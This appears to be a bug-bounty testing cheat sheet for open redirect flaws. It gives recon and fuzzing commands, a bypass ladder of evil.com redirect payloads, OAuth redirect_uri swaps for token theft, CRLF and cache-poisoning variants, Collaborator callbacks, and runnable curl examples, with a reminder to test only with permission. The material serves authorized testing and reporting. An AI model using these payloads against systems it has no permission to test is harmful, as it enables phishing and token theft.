# HOW TO TEST OPEN REDIRECT ON A LIVE TARGET (step-by-step, 2026)

## PHASE 1 - RECON: find the redirect surface (10-15 min)
# 1. Grab every URL ever seen on the target and grep redirect-ish parameters:
waybackurls target.com | grep -iE "redirect|url=|uri=|link|next|return|goto|out=|callback|continue|dest|target" | head -200
gau target.com | grep -iE "redirect|url=|link|next|return|goto|c." | head -200
# 2. Find the live ones:
httpx -l urls.txt -mc 200,301,302,303,307,308 -o live_redirects.txt
# 3. Pull header Location values (see who redirects where):
grep -E "Location:" live_redirects.txt > locations.txt
# 4. Crawl JS bundle for redirect-ish endpoints:
catend  // ~/tools: beautify all app.js and grep: "location.href","location.replace","window.open(","response.redirect","redirect("
# 5. Directory-guess common endpoints:
ffuf -w params.txt -u target.com/FUZZ -mc 200,301,302,303,307,308 -fc 404

## PHASE 2 - PARAM FUZZING (find in-scope params)
# ffuf single-pass (FUZZ=param, FUZZ2=payload):
ffuf -w params.txt:FUZZ -w payloads.txt:FUZZ2 -u "https://target.com/path?FUZZ=FUZZ2" \
     -mc 301,302,303,307,308 -fs <baseline-size> -t 50
# WATCH FOR: 302 with Location=https://evil.com. Baseline first (size of a 302 with a dummy value).

## PHASE 3 - MANUAL CONFIRMATION (never trust automatically only)
# a. grab the request from Burp, send in browser:
curl -i "https://target.com/login?next=//evil.com"
#    look for: Location: //evil.com   OR   <meta http-equiv="refresh" content="0;url=//evil.com">
#    also run: window.location / location.href / location.replace sinks in JS
# b. if filter present, walk bypass ladder:
?url=https://evil.com
?url=//evil.com
?url=\\evil.com
?url=https://evil.com@trusted.com
?url=trusted.com.evil.com
?url=https%3A%2F%2Fevil.com
?url=javascript:alert(1)
?url=https://evil.com%23@trusted.com
#    (full list: open-redirect-payloads-2026.txt section 11)
# c. CLICK-THROUGH test: because some redirects only fire on real navigation
#    (onclick handler, meta-refresh, form action, React Router). Open in browser with JS enabled.
# d. if it's a JS sink (location.href=location.search.split('url='), etc.), craft the
#    URL so the SINK executes - report needs a clickable URL, not just a header.

## PHASE 4 - THE OAuth/SSO GOLD (High bounty if present)
# OAuth flow injection:
1. Start OAuth login -> capture   /oauth/authorize?client_id=X&redirect_uri=https://target.com/cb
2. Change redirect_uri to https://evil.com/ and watch for error vs silent accept.
3. Path+CRLF: redirect_uri=https://target.com/cb%0d%0a...  (see payloads file)
4. If callback registered, test whitelist-bypass (section 11 of payloads).
5. SAML: RelayState=https://evil.com , target= etc.
# When found: report as High - it's token theft, not just phishing.

## PHASE 5 - BLIND / AUTOMATION
# Any param that 302s to a location reflecting ANY attacker value feeds Collaborator:
#   ?callback=https://YOUR-COLLABORATOR.burpcollaborator.net
#   ?url=//YOUR-COLLABORATOR
# check OOB HTTP/DNS hits under 30s. Add the param to your general fuzz wordlist after this.

## PHASE 6 - CACHE POISONING PIGGYBACK (bonus)
# If ?url= reflects into page or a CDN caches 302s:
GET /?url=//evil.com   ->  302 Location://evil.com   (cacheable?)  — repeat from a clean IP
# Cache-Control on the 302 decides. Wait for TTL, request once, see if served for others.

## PHASE 7 - FALSE-POSITIVE CHECKLIST (before you report!)
[ ] 1. Was the payload URL actually echoed in Location/meta/js - or did the app just fail-open to homepage?
[ ] 2. Same-test in an anonymous browser, not just curl (location.href vs header differ).
[ ] 3. If whitelist contains 'trusted.com' did you bypass it or just hit 'trusted.com.evil.com' subdomain of EVIL? (subdomain of evil IS your own - report only if you actually land OFF-SITE).
[ ] 4. javascript:/data: scheme still blocked by some browsers - confirm with real navigation.
[ ] 5. CRLF: the injected Set-Cookie must actually APPEND to response headers.
[ ] 6. Scope: external redirects to attacker site = in scope only if target grants phishing/redirect bounties. Check the program's rules - many mark open redirect N/A.
[ ] 7. write the minimal reproduction: one URL + one browser screenshot.

## REPORT TEMPLATE (short version)
Title: Open Redirect in <param> allows phishing / token theft
URL:  https://target.com/path?param=<payload&gt;
Steps:
 1. GET https://target.com/path?param=//evil.com
 2. Response: 302 → Location: //evil.com   (screenshot)
Impact: attacker-controlled destination on trusted domain; OAuth variant leaks codes.
Severity: Low (phishing) / High (OAuth redirect_uri)
Fix: allowlist validation server-side + disable meta/js redirects for unvalidated input.

## WORKED EXAMPLES (concrete) - copy-paste runnable
# A. live redirect param discovery (30s):
waybackurls target.com | grep -iE "redirect=|url=|uri=|link=|next=|return=|goto=|out=|dest=" | head -50
# B. baseline + bypass ladder end-to-end:
curl -si -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://target.com/login?next=https://evil.com"
curl -si -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://target.com/login?next=//evil.com"
curl -si -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://target.com/login?next=%2F%2Fevil.com"
curl -si -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://target.com/login?next=\\evil.com"
curl -si -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://target.com/login?next=https://evil.com@target.com"
curl -si -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://target.com/login?next=https://target.com.evil.com"
curl -si -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://target.com/login?next=javascript:alert(document.domain)"
# C. grep the Location header in the 302 show the attacker site:
curl -si "https://target.com/login?next=//evil.com" | grep -iE "^Location:|refresh"
# D. OAuth token-theft variant (High):
#    intercept the authorize redirect_uri, swap for https://evil.com/cb - capture if accepted.
# E. browser click-through (JS sink):
#    location.href = new URL(location.search).get('url')  ->  https://target.com/?url=//evil.com
#    confirm in a real browser (some sinks only fire on JS).

## REMEMBER
- 90% of open redirects on modern apps are LOW/NA bounties. The money is in the
  OAuth/SSO token-theft variant and in turning the redirect into SSRF or cache poisoning.
- Test it on the target you have permission for. This is detection guidance, not a go-exploit-it plan.
